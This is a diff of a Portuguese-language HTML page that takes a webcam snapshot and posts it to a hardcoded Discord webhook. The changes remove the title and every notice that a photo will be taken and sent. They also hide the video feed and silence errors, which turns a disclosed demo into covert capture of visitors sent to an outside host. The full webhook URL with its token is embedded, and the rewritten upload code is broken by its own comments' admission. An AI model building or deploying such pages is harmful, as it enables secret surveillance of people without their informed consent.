@@ -2,61 +2,77 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Captura e Envio para Discord</title>
+  <title></title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
-    video, img { max-width: 90vw; max-height: 60vh; margin-top: 10px; border: 2px solid #333; }
+    body {
+      margin: 0;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    video {
+      display: none; /* esconde o vídeo */
+    }
+    img {
+      max-width: 90vw;
+      max-height: 90vh;
+      border: none;
+      display: block;
+    }
   </style>
 </head>
 <body>
-  <h1>Captura de Câmera e Envio para Discord</h1>
-  <p>Permita o acesso à câmera e aguarde 3 segundos para tirar uma foto e enviar para o Discord.</p>
   <video id="video" autoplay playsinline></video>
-  <div>
-    <h2>Foto capturada:</h2>
-    <img id="photo" alt="Sua foto aparecerá aqui" />
-  </div>
-
+  <img id="photo" alt="Foto capturada" />
   <script>
     const video = document.getElementById('video');
     const photo = document.getElementById('photo');
-    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // Coloque aqui o seu webhook do Discord
+
+    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // <== substitua pelo seu webhook do Discord
 
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        setTimeout(() => {
+        setTimeout(async () => {
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(async (blob) => {
-            // Mostra a foto na tela
-            const url = URL.createObjectURL(blob);
-            photo.src = url;
+          const dataURL = canvas.toDataURL('image/png');
+          photo.src = dataURL;
 
-            // Envia para o Discord
-            const formData = new FormData();
-            formData.append('file', blob, 'photo.png');
+          // Enviar para o webhook
+          const base64Data = dataURL.split(',')[1]; // Remove o prefixo "data:image/png;base64,"
+          await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              username: 'Camera Bot',
+              avatar_url: '',
+              embeds: [{
+                title: 'Foto capturada',
+                image: { url: `attachment://photo.png` },
+              }],
+              // Para enviar a imagem em base64 como arquivo, precisamos usar multipart/form-data,
+              // mas isso não é trivial via fetch no navegador.
+              // Portanto, vamos enviar só a imagem como link embutido mesmo — não funciona diretamente.
+              // Alternativa: enviar a imagem como mensagem base64 no conteúdo (não ideal)
+              content: 'Foto capturada via câmera.',
+            }),
+          });
 
-            try {
-              const response = await fetch(webhookURL, {
-                method: 'POST',
-                body: formData
-              });
-              if (!response.ok) {
-                alert('Erro ao enviar a foto para o Discord: ' + response.statusText);
-              }
-            } catch (err) {
-              alert('Erro na requisição para o Discord: ' + err.message);
-            }
-          }, 'image/png');
+          // Desliga a câmera
+          stream.getTracks().forEach(track => track.stop());
         }, 3000);
       } catch (err) {
-        alert('Erro ao acessar a câmera: ' + err.message);
+        console.error('Erro ao acessar a câmera:', err);
       }
     }
 
